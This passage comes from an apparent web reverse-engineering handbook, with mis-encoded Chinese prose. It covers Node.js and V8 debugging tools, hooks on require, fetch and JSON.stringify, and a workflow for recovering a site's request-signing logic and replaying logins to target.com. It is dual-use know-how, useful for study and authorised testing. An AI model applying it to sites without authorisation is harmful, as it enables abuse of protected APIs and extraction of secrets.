<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">id</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="s1">&#39;crypto&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[Hook] æ‹¦æˆª crypto æ¨¡å—&#39;</span><span class="p">);</span>
<span class="w">        </span><span class="k">debugger</span><span class="p">;</span><span class="w">  </span><span class="c1">// æ–­ç‚¹</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">originalRequire</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">arguments</span><span class="p">);</span>
<span class="p">};</span>

<span class="c1">// åŠ è½½ç›®æ ‡è„šæœ¬</span>
<span class="nx">require</span><span class="p">(</span><span class="s1">&#39;./suspicious-script.js&#39;</span><span class="p">);</span>
</code></pre>
      </div>

      <p><strong>è¿è¡Œ</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code>node<span class="w"> </span>--inspect-brk<span class="w"> </span>hook-require.js
</code></pre>
      </div>

      <hr />

      <h2 id="10-å·¥å…·æ¨è">10. å·¥å…·æ¨è</h2>

      <table>
        <thead>
          <tr>
            <th>å·¥å…·</th>
            <th>ç”¨é€”</th>
            <th>å®‰è£…</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>ndb</strong></td>
            <td>Google å¼€å‘çš„å¢å¼ºç‰ˆè°ƒè¯•å™¨</td>
            <td><code>npm install -g ndb</code></td>
          </tr>
          <tr>
            <td><strong>node-inspector</strong></td>
            <td>æ—§ç‰ˆ Node.js è°ƒè¯•å™¨ï¼ˆå·²åºŸå¼ƒï¼‰</td>
            <td>-</td>
          </tr>
          <tr>
            <td><strong>nodemon</strong></td>
            <td>è‡ªåŠ¨é‡å¯ + è°ƒè¯•</td>
            <td><code>npm install -g nodemon</code></td>
          </tr>
          <tr>
            <td><strong>debug</strong></td>
            <td>æ¡ä»¶æ—¥å¿—è¾“å‡º</td>
            <td><code>npm install debug</code></td>
          </tr>
          <tr>
            <td><strong>why-is-node-running</strong></td>
            <td>æŸ¥æ‰¾é˜»æ­¢é€€å‡ºçš„èµ„æº</td>
            <td><code>npm install why-is-node-running</code></td>
          </tr>
        </tbody>
      </table>

      <p><strong>ndb ä½¿ç”¨</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code>ndb<span class="w"> </span>script.js

<span class="c1"># æˆ–è°ƒè¯• npm script</span>
ndb<span class="w"> </span>npm<span class="w"> </span>start
</code></pre>
      </div>

      <p><strong>nodemon + è°ƒè¯•</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code>nodemon<span class="w"> </span>--inspect-brk<span class="w"> </span>script.js
</code></pre>
      </div>

      <p><strong>why-is-node-running ä½¿ç”¨</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">why</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;why-is-node-running&#39;</span><span class="p">);</span>

<span class="nx">setTimeout</span><span class="p">(()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">why</span><span class="p">();</span><span class="w">  </span><span class="c1">// æ‰“å°æ‰€æœ‰æœªå…³é—­çš„èµ„æº</span>
<span class="p">},</span><span class="w"> </span><span class="mf">5000</span><span class="p">);</span>
</code></pre>
      </div>

      <hr />

      <h2 id="æ€»ç»“">æ€»ç»“</h2>

      <p>Node.js è°ƒè¯•çš„å…³é”®æŠ€èƒ½ï¼š</p>

      <ol>
        <li>âœ… <strong>åŸºç¡€è°ƒè¯•</strong>: <code>--inspect-brk</code> + Chrome DevTools / VSCode</li>
        <li>âœ… <strong>å†…å­˜åˆ†æ</strong>: Heap Snapshot æå–å¯†é’¥å’Œæ•æ„Ÿæ•°æ®</li>
        <li>âœ… <strong>æ€§èƒ½åˆ†æ</strong>: CPU Profiler å®šä½è€—æ—¶å‡½æ•°</li>
        <li>âœ… <strong>å¼‚æ­¥è°ƒè¯•</strong>: async/await + async stack traces</li>
        <li>âœ… <strong>ç¬¬ä¸‰æ–¹åŒ…è°ƒè¯•</strong>: npm link + ç¦ç”¨ skipFiles</li>
        <li>âœ… <strong>è¿œç¨‹è°ƒè¯•</strong>: SSH éš§é“ + Docker ç«¯å£æ˜ å°„</li>
        <li>âœ… <strong>å®æˆ˜æŠ€å·§</strong>: Hook requireã€æ¡ä»¶æ–­ç‚¹ã€REPL è°ƒè¯•</li>
      </ol>

      <p><strong>è®°ä½</strong>: Node.js è°ƒè¯•çš„æœ¬è´¨æ˜¯åˆ©ç”¨ Chrome DevTools Protocolï¼ŒæŒæ¡äº†æµè§ˆå™¨è°ƒè¯•ï¼Œå°±æŒæ¡äº† Node.js è°ƒè¯•ã€‚</p>

      <hr />

      <h2 id="ç›¸å…³ç« èŠ‚">ç›¸å…³ç« èŠ‚</h2>

      <ul>
        <li><a href="#02-Tooling-browser-devtools">æµè§ˆå™¨å¼€å‘è€…å·¥å…·</a></li>
        <li><a href="#03-Basic-Recipes-dynamic-parameter-analysis">åŠ¨æ€å‚æ•°åˆ†æ</a></li>
        <li><a href="#02-Tooling-ast-tools">AST å·¥å…·</a></li>
        <li><a href="#02-Tooling-puppeteer-playwright">Puppeteer ä¸ Playwright</a></li>
      </ul>

    </div>

    <div class="section" id="02-Tooling-v8-tools">
      <h2>24. V8 Tools</h2>
      <h1 id="v8-å¼•æ“å·¥å…·">V8 å¼•æ“å·¥å…·</h1>

      <h2 id="æ¦‚è¿°">æ¦‚è¿°</h2>

      <p>å½“æˆ‘ä»¬åœ¨åˆ†ææ·±åº¦æ··æ·†ä»£ç ï¼Œæˆ–è€…ç ”ç©¶æµè§ˆå™¨æ¼æ´æ—¶ï¼Œæ™®é€šçš„ JS è°ƒè¯•å™¨å¯èƒ½ä¸å¤Ÿç”¨äº†ã€‚è¿™æ—¶æˆ‘ä»¬éœ€è¦ç›´æ¥ä½¿ç”¨ V8 å¼•æ“æä¾›çš„å·¥å…·æ¥æŸ¥çœ‹å­—èŠ‚ç ï¼ˆBytecodeï¼‰å’Œä¼˜åŒ–è¿‡ç¨‹ã€‚</p>

      <hr />

      <h2 id="1-d8-debug8">1. D8 (Debug8)</h2>

      <p>D8 æ˜¯ V8 å¼•æ“çš„ç‹¬ç«‹ Shellï¼Œç±»ä¼¼ Node.js çš„ REPLï¼Œä½†æä¾›äº†æ›´å¤šåº•å±‚ APIã€‚</p>

      <h3 id="å®‰è£…">å®‰è£…</h3>

      <p>é€šå¸¸å¯ä»¥é€šè¿‡ <code>jsvu</code> (JavaScript Version Updater) æ¥å®‰è£…æœ€æ–°æˆ–ç‰¹å®šç‰ˆæœ¬çš„ V8/D8ã€‚</p>

      <div class="codehilite">
        <pre><span></span><code>npm<span class="w"> </span>install<span class="w"> </span>-g<span class="w"> </span>jsvu
jsvu<span class="w"> </span><span class="c1"># æŒ‰ç…§æç¤ºé€‰æ‹© install v8</span>
</code></pre>
      </div>

      <h3 id="æŸ¥çœ‹å­—èŠ‚ç -print-bytecode">æŸ¥çœ‹å­—èŠ‚ç  (&#8211;print-bytecode)</h3>

      <p>é€™æ˜¯åˆ†ææ··æ·†é€»è¾‘çš„ç¥å™¨ã€‚å³ä¾¿æºç å˜é‡åè¢«æ··æ·†äº†ï¼Œå…¶åº•å±‚çš„å­—èŠ‚ç æ“ä½œæ˜¯ä¸ä¼šå˜çš„ã€‚</p>

      <div class="codehilite">
        <pre><span></span><code>v8<span class="w"> </span>--print-bytecode<span class="w"> </span>script.js
</code></pre>
      </div>

      <p>è¾“å‡ºç¤ºä¾‹ï¼š</p>

      <pre><code>[generated bytecode for function: test (0x...)]
Parameter count 2
Register count 1
Frame size 8
   12 E&gt; 0x... @    0 : a0                StackCheck
   23 S&gt; 0x... @    1 : 25 02             Ldar a1
   25 E&gt; 0x... @    3 : 34 03 00          Add a0, [0]
   30 S&gt; 0x... @    6 : a4                Return
</code></pre>

      <p>é€šè¿‡é˜…è¯» Bytecodeï¼Œæˆ‘ä»¬å¯ä»¥è¿˜åŸå‡ºæ•°å­¦è¿ç®—é€»è¾‘ã€‚</p>

      <hr />

      <h2 id="2-æ€§èƒ½ä¸ä¼˜åŒ–åˆ†æ">2. æ€§èƒ½ä¸ä¼˜åŒ–åˆ†æ</h2>

      <h3 id="turbolizer">Turbolizer</h3>

      <p>ä¸€ä¸ªç”¨äºå¯è§†åŒ– V8 TurboFan (ä¼˜åŒ–ç¼–è¯‘å™¨) ä¼˜åŒ–æµç¨‹çš„å·¥å…·ã€‚</p>

      <ol>
        <li>ç”Ÿæˆ JSON æ—¥å¿—: <code>v8 --trace-turbo script.js</code></li>
        <li>æ‰“å¼€åœ¨çº¿å·¥å…·æˆ–æœ¬åœ°éƒ¨ç½²çš„ Turbolizerï¼ŒåŠ è½½ç”Ÿæˆçš„ <code>turbo.cfg</code> æˆ– <code>json</code> æ–‡ä»¶ã€‚</li>
        <li><strong>ç”¨é€”</strong>: é€šè¿‡æŸ¥çœ‹æ§åˆ¶æµå›¾ (Control Flow Graph)ï¼Œå¯ä»¥éå¸¸æ¸…æ™°åœ°çœ‹åˆ°ä»£ç çš„çœŸå®æ‰§è¡Œè·¯å¾„ï¼Œæ— è§†æºç å±‚é¢çš„æ§åˆ¶æµå¹³å¦åŒ–æ··æ·†ã€‚</li>
      </ol>

      <hr />

      <h2 id="3-å¸¸ç”¨-v8-flag">3. å¸¸ç”¨ V8 Flag</h2>

      <ul>
        <li><code>--print-opt-code</code>: æ‰“å°ä¼˜åŒ–åçš„æ±‡ç¼–ä»£ç ã€‚</li>
        <li><code>--trace-opt</code>: è·Ÿè¸ªä¼˜åŒ–è¿‡ç¨‹ï¼ˆä½•æ—¶ä¼˜åŒ–ï¼Œä½•æ—¶å»ä¼˜åŒ–ï¼‰ã€‚</li>
        <li><code>--trace-deopt</code>: è·Ÿè¸ªå»ä¼˜åŒ–ï¼ˆDeoptimizationï¼‰çš„åŸå› ã€‚è¿™åœ¨åˆ†æä¸ºäº†è®© V8 å˜æ…¢è€Œæ•…æ„æ„é€ çš„æ··æ·†ä»£ç æ—¶å¾ˆæœ‰ç”¨ã€‚</li>
      </ul>

      <hr />

      <h2 id="æ€»ç»“">æ€»ç»“</h2>

      <p>ä½¿ç”¨ V8 å·¥å…·æ˜¯ Web é€†å‘çš„<strong>æ ¸æ­¦å™¨</strong>ã€‚å½“ JS å±‚é¢çš„åˆ†æé™·å…¥åƒµå±€æ—¶ï¼Œä¸‹æ²‰åˆ°å¼•æ“å±‚é¢å¾€å¾€èƒ½çœ‹åˆ°ä¸ä¸€æ ·çš„é£æ™¯ã€‚</p>

    </div>
  </div>
  <div class="chapter">
    <h1 class="no-page-break">ğŸ“„ Part IV: Basic Recipes</h1>

    <div class="section" id="03-Basic-Recipes-re-workflow">
      <h2>25. RE Workflow</h2>
      <h1 id="web-é€†å‘å·¥ç¨‹å·¥ä½œæµ">Web é€†å‘å·¥ç¨‹å·¥ä½œæµ</h1>

      <p>ä¸€ä¸ªç³»ç»ŸåŒ–çš„ Web é€†å‘åˆ†æå®Œæ•´æµç¨‹ï¼Œä»åˆæ­¥ä¾¦æŸ¥åˆ°è‡ªåŠ¨åŒ–å®ç°ã€‚</p>

      <hr />

      <h2 id="é…æ–¹ä¿¡æ¯">ğŸ“Š é…æ–¹ä¿¡æ¯</h2>

      <table>
        <thead>
          <tr>
            <th>é¡¹ç›®</th>
            <th>è¯´æ˜</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>éš¾åº¦</strong></td>
            <td>â­â­â­ (ä¸­çº§)</td>
          </tr>
          <tr>
            <td><strong>é¢„è®¡æ—¶é—´</strong></td>
            <td>2-8 å°æ—¶ (æ ¹æ®ç›®æ ‡å¤æ‚åº¦)</td>
          </tr>
          <tr>
            <td><strong>æ‰€éœ€å·¥å…·</strong></td>
            <td>Chrome DevTools, Burp Suite (å¯é€‰), Python/Node.js</td>
          </tr>
          <tr>
            <td><strong>é€‚ç”¨åœºæ™¯</strong></td>
            <td>ä»»ä½• Web é€†å‘é¡¹ç›®</td>
          </tr>
        </tbody>
      </table>

      <hr />

      <h2 id="å­¦ä¹ ç›®æ ‡">ğŸ¯ å­¦ä¹ ç›®æ ‡</h2>

      <p>å®Œæˆæœ¬é…æ–¹åï¼Œä½ å°†èƒ½å¤Ÿï¼š</p>

      <ul>
        <li>âœ… ç³»ç»ŸåŒ–åœ°åˆ†æä»»ä½• Web åº”ç”¨</li>
        <li>âœ… å¿«é€Ÿå®šä½å…³é”®åŠ å¯†å’Œç­¾åé€»è¾‘</li>
        <li>âœ… é€‰æ‹©åˆé€‚çš„è‡ªåŠ¨åŒ–æ–¹æ¡ˆ</li>
        <li>âœ… æ„å»ºå¯å¤ç°çš„é€†å‘æµç¨‹</li>
      </ul>

      <hr />

      <h2 id="é˜¶æ®µä¸€ä¿¡æ¯æ”¶é›†-reconnaissance">é˜¶æ®µä¸€ï¼šä¿¡æ¯æ”¶é›† (Reconnaissance)</h2>

      <h3 id="1-ç›®æ ‡ç¡®è®¤">1. ç›®æ ‡ç¡®è®¤</h3>

      <ul>
        <li><strong>æ˜ç¡®ç›®æ ‡</strong>: è¦é€†å‘ä»€ä¹ˆåŠŸèƒ½ï¼Ÿç™»å½•ï¼Ÿæ•°æ®åŠ å¯†ï¼ŸAPI ç­¾åï¼Ÿ</li>
        <li><strong>åˆæ³•æ€§æ£€æŸ¥</strong>: ç¡®ä¿åœ¨æˆæƒèŒƒå›´å†…è¿›è¡Œæµ‹è¯•</li>
      </ul>

      <h3 id="2-æŠ€æœ¯æ ˆè¯†åˆ«">2. æŠ€æœ¯æ ˆè¯†åˆ«</h3>

      <p><strong>å·¥å…·</strong>:</p>

      <ul>
        <li><strong>Wappalyzer</strong> (æµè§ˆå™¨æ’ä»¶): è¯†åˆ«æ¡†æ¶ã€åº“ã€æœåŠ¡å™¨</li>
        <li><strong>BuiltWith</strong>: æŸ¥çœ‹ç½‘ç«™æŠ€æœ¯æ ˆ</li>
      </ul>

      <p><strong>æ‰‹åŠ¨æ£€æŸ¥</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// Console ä¸­æŸ¥çœ‹å…¨å±€å¯¹è±¡</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">jQuery</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">jQuery</span><span class="p">.</span><span class="nx">fn</span><span class="p">.</span><span class="nx">jquery</span><span class="w">  </span><span class="c1">// jQuery ç‰ˆæœ¬</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">React</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">React</span><span class="p">.</span><span class="nx">version</span><span class="w">      </span><span class="c1">// React ç‰ˆæœ¬</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">Vue</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">Vue</span><span class="p">.</span><span class="nx">version</span><span class="w">          </span><span class="c1">// Vue ç‰ˆæœ¬</span>
</code></pre>
      </div>

      <h3 id="3-èµ„æºæšä¸¾">3. èµ„æºæšä¸¾</h3>

      <ul>
        <li><strong>æŸ¥çœ‹ HTML æºä»£ç </strong>: <code>Ctrl+U</code></li>
        <li><strong>æ£€æŸ¥ JavaScript æ–‡ä»¶</strong>: Sources é¢æ¿æŸ¥çœ‹æ‰€æœ‰ JS æ–‡ä»¶</li>
        <li><strong>æ£€æŸ¥ç½‘ç»œè¯·æ±‚</strong>: Network é¢æ¿æŸ¥çœ‹ API ç«¯ç‚¹</li>
      </ul>

      <hr />

      <h2 id="é˜¶æ®µäºŒæµé‡åˆ†æ-traffic-analysis">é˜¶æ®µäºŒï¼šæµé‡åˆ†æ (Traffic Analysis)</h2>

      <h3 id="1-æŠ“åŒ…åˆ†æ">1. æŠ“åŒ…åˆ†æ</h3>

      <p><strong>ç›®æ ‡</strong>: äº†è§£å®¢æˆ·ç«¯ä¸æœåŠ¡å™¨çš„é€šä¿¡æ–¹å¼</p>

      <p><strong>æ­¥éª¤</strong>:</p>

      <ol>
        <li>æ‰“å¼€ DevTools -> Network é¢æ¿</li>
        <li>æ¸…ç©ºè®°å½•ï¼Œæ‰§è¡Œç›®æ ‡æ“ä½œï¼ˆå¦‚ç™»å½•ã€æäº¤è¡¨å•ï¼‰</li>
        <li>åˆ†æè¯·æ±‚ï¼š
          <ul>
            <li>è¯·æ±‚æ–¹æ³•ï¼ˆGET/POSTï¼‰</li>
            <li>è¯·æ±‚å‚æ•°</li>
            <li>è¯·æ±‚å¤´ï¼ˆç‰¹åˆ«æ˜¯è‡ªå®šä¹‰ Headerï¼‰</li>
            <li>å“åº”æ•°æ®æ ¼å¼</li>
          </ul>
        </li>
      </ol>

      <p><strong>å…³é”®é—®é¢˜</strong>:</p>

      <ul>
        <li>æ˜¯å¦æœ‰ç­¾åå‚æ•°ï¼Ÿï¼ˆå¦‚ <code>sign</code>, <code>signature</code>, <code>token</code>ï¼‰</li>
        <li>æ—¶é—´æˆ³æ ¼å¼ï¼Ÿï¼ˆUnix æ—¶é—´æˆ³ / æ¯«ç§’ï¼‰</li>
        <li>æ˜¯å¦æœ‰åŠ å¯†æ•°æ®ï¼Ÿï¼ˆBase64 / Hex ç¼–ç ç‰¹å¾ï¼‰</li>
      </ul>

      <h3 id="2-å®šä½å…³é”®è¯·æ±‚">2. å®šä½å…³é”®è¯·æ±‚</h3>

      <p>åœ¨ Network é¢æ¿ä½¿ç”¨è¿‡æ»¤å™¨ï¼š</p>

      <ul>
        <li>Filter by keyword: <code>sign</code>, <code>encrypt</code>, <code>token</code></li>
        <li>Filter by type: <code>Fetch/XHR</code></li>
      </ul>

      <hr />

      <h2 id="é˜¶æ®µä¸‰é™æ€åˆ†æ-static-analysis">é˜¶æ®µä¸‰ï¼šé™æ€åˆ†æ (Static Analysis)</h2>

      <h3 id="1-javascript-ä»£ç å®šä½">1. JavaScript ä»£ç å®šä½</h3>

      <p><strong>æ–¹æ³•ä¸€ï¼šå…¨å±€æœç´¢</strong></p>

      <ol>
        <li><code>Ctrl+Shift+F</code> æ‰“å¼€å…¨å±€æœç´¢</li>
        <li>æœç´¢å…³é”®è¯ï¼š
          <ul>
            <li>å‚æ•°åï¼š<code>sign</code>, <code>timestamp</code></li>
            <li>åŠ å¯†å…³é”®è¯ï¼š<code>encrypt</code>, <code>crypto</code>, <code>MD5</code>, <code>AES</code></li>
            <li>API ç«¯ç‚¹ï¼š<code>/api/login</code></li>
          </ul>
        </li>
      </ol>

      <p><strong>æ–¹æ³•äºŒï¼šåˆ©ç”¨ Network Initiator</strong></p>

      <ol>
        <li>åœ¨ Network é¢æ¿ç‚¹å‡»ç›®æ ‡è¯·æ±‚</li>
        <li>æŸ¥çœ‹ Initiator æ ‡ç­¾é¡µ</li>
        <li>ç‚¹å‡»è°ƒç”¨é“¾ä¸­çš„æ–‡ä»¶åï¼Œè·³è½¬åˆ°æºç </li>
      </ol>

      <h3 id="2-ä»£ç ç¾åŒ–">2. ä»£ç ç¾åŒ–</h3>

      <p>å¦‚æœä»£ç è¢«å‹ç¼©ï¼š</p>

      <ul>
        <li>DevTools è‡ªåŠ¨æ ¼å¼åŒ–ï¼šç‚¹å‡» <code>{}</code> æŒ‰é’®</li>
        <li>åœ¨çº¿å·¥å…·ï¼š<code>beautifier.io</code></li>
      </ul>

      <p>å¦‚æœä»£ç è¢«æ··æ·†ï¼š</p>

      <ul>
        <li>å‚è€ƒ <a href="#04-Advanced-Recipes-javascript-deobfuscation">JavaScript åæ··æ·†</a></li>
      </ul>

      <h3 id="3-ç®—æ³•è¯†åˆ«">3. ç®—æ³•è¯†åˆ«</h3>

      <p><strong>å¸¸è§ç‰¹å¾</strong>:</p>

      <ul>
        <li>MD5: <code>16 å­—èŠ‚</code> è¾“å‡ºï¼Œé€šå¸¸è¡¨ç¤ºä¸º 32 ä½åå…­è¿›åˆ¶</li>
        <li>SHA256: <code>32 å­—èŠ‚</code> è¾“å‡ºï¼Œ64 ä½åå…­è¿›åˆ¶</li>
        <li>AES: éœ€è¦å¯†é’¥å’Œ IV</li>
        <li>Base64: ç»“å°¾å¯èƒ½æœ‰ <code>=</code> å¡«å……</li>
      </ul>

      <hr />

      <h2 id="é˜¶æ®µå››åŠ¨æ€è°ƒè¯•-dynamic-analysis">é˜¶æ®µå››ï¼šåŠ¨æ€è°ƒè¯• (Dynamic Analysis)</h2>

      <h3 id="1-è®¾ç½®æ–­ç‚¹">1. è®¾ç½®æ–­ç‚¹</h3>

      <p><strong>æ–­ç‚¹ç±»å‹</strong>:</p>

      <ul>
        <li><strong>è¡Œæ–­ç‚¹</strong>: ç›´æ¥ç‚¹å‡»è¡Œå·</li>
        <li><strong>æ¡ä»¶æ–­ç‚¹</strong>: å³é”®è¡Œå· -> &#8220;Add conditional breakpoint&#8221;</li>
        <li><strong>XHR/Fetch æ–­ç‚¹</strong>: åœ¨ Sources é¢æ¿å³ä¾§å‹¾é€‰</li>
        <li><strong>äº‹ä»¶æ–­ç‚¹</strong>: Mouse -> click</li>
      </ul>

      <h3 id="2-è¿½è¸ªå‚æ•°ç”Ÿæˆ">2. è¿½è¸ªå‚æ•°ç”Ÿæˆ</h3>

      <p>å½“æ–­ç‚¹åœä¸‹åï¼š</p>

      <ol>
        <li>æŸ¥çœ‹ <strong>Call Stack</strong> (è°ƒç”¨æ ˆ)</li>
        <li>æŸ¥çœ‹ <strong>Scope</strong> (ä½œç”¨åŸŸå˜é‡)</li>
        <li>å•æ­¥æ‰§è¡Œ (<code>F10</code> / <code>F11</code>)ï¼Œè§‚å¯Ÿå˜é‡å˜åŒ–</li>
      </ol>

      <h3 id="3-hook-å…³é”®å‡½æ•°">3. Hook å…³é”®å‡½æ•°</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// Hook fetch</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">originalFetch</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">window</span><span class="p">.</span><span class="nx">fetch</span><span class="p">;</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">fetch</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(...</span><span class="nx">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[Fetch]&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">);</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">originalFetch</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">arguments</span><span class="p">);</span>
<span class="p">};</span>

<span class="c1">// Hook JSON.stringify (å¸¸ç”¨äºæ„é€ è¯·æ±‚ä½“)</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">originalStringify</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">;</span>
<span class="nb">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">obj</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[JSON.stringify]&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">obj</span><span class="p">);</span>
<span class="w">    </span><span class="k">debugger</span><span class="p">;</span><span class="w"> </span><span class="c1">// è‡ªåŠ¨æ–­ç‚¹</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">originalStringify</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">arguments</span><span class="p">);</span>
<span class="p">};</span>
</code></pre>
      </div>

      <hr />

      <h2 id="é˜¶æ®µäº”é€»è¾‘è¿˜åŸ-logic-reconstruction">é˜¶æ®µäº”ï¼šé€»è¾‘è¿˜åŸ (Logic Reconstruction)</h2>

      <h3 id="1-æ¢³ç†ç­¾åæµç¨‹">1. æ¢³ç†ç­¾åæµç¨‹</h3>

      <p>ç»˜åˆ¶æµç¨‹å›¾ï¼š</p>

      <pre><code>ç”¨æˆ·è¾“å…¥ -&gt;
å‚æ•°æ”¶é›† (username, password, timestamp) -&gt;
å‚æ•°æ’åº -&gt;
å­—ç¬¦ä¸²æ‹¼æ¥ -&gt;
åŠ ç› (salt) -&gt;
å“ˆå¸Œè®¡ç®— (MD5/SHA256) -&gt;
ç­¾åå­—æ®µ (sign)
</code></pre>

      <h3 id="2-æå–å…³é”®ä»£ç ">2. æå–å…³é”®ä»£ç </h3>

      <p>å°†æ ¸å¿ƒåŠ å¯†/ç­¾åå‡½æ•°å¤åˆ¶åˆ°å•ç‹¬æ–‡ä»¶ï¼Œæˆ–ç”¨ Python/Node.js é‡å†™ã€‚</p>

      <hr />

      <h2 id="é˜¶æ®µå…­è‡ªåŠ¨åŒ–å®ç°-automation">é˜¶æ®µå…­ï¼šè‡ªåŠ¨åŒ–å®ç° (Automation)</h2>

      <h3 id="æ–¹æ¡ˆä¸€æ‰£-javascript-ä»£ç ">æ–¹æ¡ˆä¸€ï¼šæ‰£ JavaScript ä»£ç </h3>

      <p><strong>é€‚ç”¨åœºæ™¯</strong>: ç®—æ³•å¤æ‚ï¼Œéš¾ä»¥è¿˜åŸ</p>

      <p><strong>å·¥å…·</strong>: Node.js</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// encrypt.js</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">generateSign</span><span class="p">(</span><span class="nx">params</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// å¤åˆ¶çš„åŸå§‹ä»£ç </span>
<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">str</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Object</span><span class="p">.</span><span class="nx">keys</span><span class="p">(</span><span class="nx">params</span><span class="p">).</span><span class="nx">sort</span><span class="p">().</span><span class="nx">map</span><span class="p">(</span><span class="nx">k</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="sb">`</span><span class="si">${</span><span class="nx">k</span><span class="si">}</span><span class="sb">=</span><span class="si">${</span><span class="nx">params</span><span class="p">[</span><span class="nx">k</span><span class="p">]</span><span class="si">}</span><span class="sb">`</span><span class="p">).</span><span class="nx">join</span><span class="p">(</span><span class="s1">&#39;&amp;&#39;</span><span class="p">);</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">md5</span><span class="p">(</span><span class="nx">str</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">&#39;secret_salt&#39;</span><span class="p">);</span>
<span class="p">}</span>

<span class="nx">module</span><span class="p">.</span><span class="nx">exports</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">generateSign</span><span class="w"> </span><span class="p">};</span>
</code></pre>
      </div>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># main.py</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">execjs</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>

<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;encrypt.js&#39;</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">js_code</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>

<span class="n">ctx</span> <span class="o">=</span> <span class="n">execjs</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="n">js_code</span><span class="p">)</span>
<span class="n">sign</span> <span class="o">=</span> <span class="n">ctx</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="s1">&#39;generateSign&#39;</span><span class="p">,</span> <span class="p">{</span><span class="s1">&#39;user&#39;</span><span class="p">:</span> <span class="s1">&#39;admin&#39;</span><span class="p">,</span> <span class="s1">&#39;pass&#39;</span><span class="p">:</span> <span class="s1">&#39;123456&#39;</span><span class="p">})</span>

<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s1">&#39;https://target.com/api/login&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;sign&#39;</span><span class="p">:</span> <span class="n">sign</span><span class="p">})</span>
</code></pre>
      </div>

      <h3 id="æ–¹æ¡ˆäºŒçº¯-python-å®ç°">æ–¹æ¡ˆäºŒï¼šçº¯ Python å®ç°</h3>

      <p><strong>é€‚ç”¨åœºæ™¯</strong>: ç®—æ³•ç®€å•ï¼Œå¯ä»¥ç”¨ Python é‡å†™</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">hashlib</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">time</span>

<span class="k">def</span><span class="w"> </span><span class="nf">generate_sign</span><span class="p">(</span><span class="n">params</span><span class="p">):</span>
